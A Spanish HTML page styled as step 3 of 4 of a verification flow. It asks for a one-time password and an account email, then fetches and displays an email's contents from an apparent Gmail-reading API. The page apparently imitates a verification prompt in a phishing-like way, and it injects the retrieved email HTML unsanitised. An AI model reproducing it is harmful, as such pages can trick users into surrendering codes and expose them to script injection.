<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Paso 3 de 4 - Verificación</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; color: #333; }
        .container { max-width: 400px; margin: 50px auto; padding: 20px; border: 1px solid #eee; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        .logo { width: 100px; margin-bottom: 20px; }
        .step { color: #ff6600; font-size: 14px; font-weight: bold; }
        h2 { margin-top: 5px; color: #1a2a40; }
        .input-group { margin-bottom: 15px; }
        input { width: 90%; padding: 12px; border: 1px solid #ccc; border-radius: 5px; font-size: 14px; }
        .btn-aceptar { background-color: #f0f0f0; border: 1px solid #999; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-weight: bold; }
        .btn-aceptar:hover { background-color: #e0e0e0; }
        /* Estilo para el área donde aparecerá el correo */
        #resultado { 
            margin-top: 20px; 
            padding: 15px; 
            border-radius: 5px; 
            background: #f9f9f9; 
            font-size: 13px; 
            text-align: left; 
            min-height: 50px;
            border: 1px dashed #bbb;
            overflow-wrap: break-word;
        }
        .loading { color: #ff6600; font-style: italic; }
        .error { color: #d93025; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://bot1-iota.vercel.app/logo.png" alt="Logo" class="logo"> <div class="step">Paso 3 de 4</div>
    <h2>Último paso</h2>

    <div class="input-group">
        <input type="text" placeholder="Ingresar contraseña única">
    </div>
    <div class="input-group">
        <input type="email" placeholder="Ingresar email de la cuenta">
    </div>

    <div id="resultado">Los datos del correo aparecerán aquí al dar clic...</div>

    <div style="margin-top: 20px;">
        <span style="color: #ff6600; cursor: pointer; margin-right: 15px;">Volver</span>
        <button id="btnAceptar" class="btn-aceptar">Aceptar</button>
    </div>
</div>

<script>
    document.getElementById('btnAceptar').onclick = async () => {
        const display = document.getElementById('resultado');
        display.innerHTML = '<span class="loading">Conectando con Gmail...</span>';
        
        try {
            // Llamada a tu API en Vercel
            const res = await fetch('/api/obtener-correo');
            
            if (!res.ok) throw new Error('Error en la respuesta del servidor');
            
            const data = await res.json();

            if (data.contenido) {
                // Mostramos el contenido. Si es HTML, se renderizará.
                display.innerHTML = `<strong>Contenido del correo:</strong><br>${data.contenido}`;
            } else if (data.error) {
                display.innerHTML = `<span class="error">${data.error}</span>`;
            }
        } catch (error) {
            display.innerHTML = `<span class="error">Error: No se pudo obtener el correo. Revisa los logs.</span>`;
            console.error(error);
        }
    };
</script>

</body>
</html>
